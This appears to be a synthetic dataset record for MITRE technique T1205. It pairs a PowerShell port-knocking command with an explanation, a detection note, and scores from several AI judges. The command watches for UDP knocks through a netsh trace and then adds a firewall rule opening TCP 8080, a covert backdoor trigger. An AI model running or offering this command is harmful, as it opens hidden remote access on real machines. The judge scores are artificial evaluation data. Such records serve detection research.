@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "& netsh trace start capture=yes traceFile='C:\\ProgramData\\svclogs\\knock.etl' persistent=no maxsize=50 filemode=single correlation=no keywords=ut:TcpIp level=5 scenario=InternetClient capturetype=circular Ethernet.Type=IPv4 IPv4.UDP.Port=49000;Start-Job -ScriptBlock { $f='C:\\ProgramData\\svclogs\\knock.etl'; while(-not (Test-Path $f)){Start-Sleep 1}; $baseline=0; while($true){$len=(Get-Item $f).Length; if($len -gt ($baseline+4096)){ & netsh advfirewall firewall add rule name='Knock-Open-8080' dir=in action=allow protocol=TCP localport=8080; break }; $baseline=$len; Start-Sleep 1}}|Out-Null",
+  "explanation": "Begins a filtered netsh packet capture focused on UDP/49000 (a knock port). A background job watches for capture growth that indicates inbound knocks and then opens TCP/8080 via netsh. Requires elevation for netsh trace and firewall rule changes.",
+  "rationale_steps": [
+    "Start a netsh trace limited to suspected knock traffic to minimize noise.",
+    "Use file growth as a crude signal of received knocks, then open a hidden service port.",
+    "Detection: monitor for netsh trace sessions (ETW providers enabled), captures written to atypical paths, and new firewall rules exposing non-standard service ports."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-3c835ea5-8a2701af",
+  "source_prompt_hash": "3c835ea5",
+  "timestamp_utc": "2025-09-30T05:43:16.300607Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "PowerShell one-liner is well-formed with balanced quoting/braces and valid separators, though the netsh argument 'capturetype=circular' is likely invalid or nonstandard.",
+        "semantic_score": 4,
+        "semantic_justification": "Implements a UDP port-knock style trigger by monitoring capture growth to open TCP/8080, aligning with Traffic Signaling, but depends on elevation and a coarse file-size heuristic that may affect reliability.",
+        "combined_score": 4.0,
+        "confidence": 0.74,
+        "timestamp": "2025-10-01T15:03:01.965624Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is largely well-formed PowerShell with balanced braces and valid semicolons, but the leading `&` before `netsh` combined with the semicolon chaining and `Start-Job` on the same line creates a minor ambiguity in how the compound statement is parsed, though it would likely execute correctly in practice.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements a port-knocking mechanism aligned with T1205: it uses netsh to capture UDP traffic on a designated knock port (49000), monitors the capture file for growth indicating an inbound knock signal, and then dynamically opens a firewall rule for TCP/8080, which is a realistic and operationally plausible traffic signaling trigger workflow.",
+        "combined_score": 4.5,
+        "confidence": 0.85,
+        "timestamp": "2026-02-19T03:50:30.402183Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed, uses correct PowerShell syntax for background jobs and script blocks, and utilizes valid netsh trace and firewall parameters with properly balanced quotes and separators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements a port-knocking (traffic signaling) mechanism by leveraging native Windows diagnostic tools to monitor specific network traffic and trigger a firewall state change, which aligns exactly with T1205.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-19T03:50:39.399866Z"
+      }
+    ],
+    "llm_average_syntactic": 4.333,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
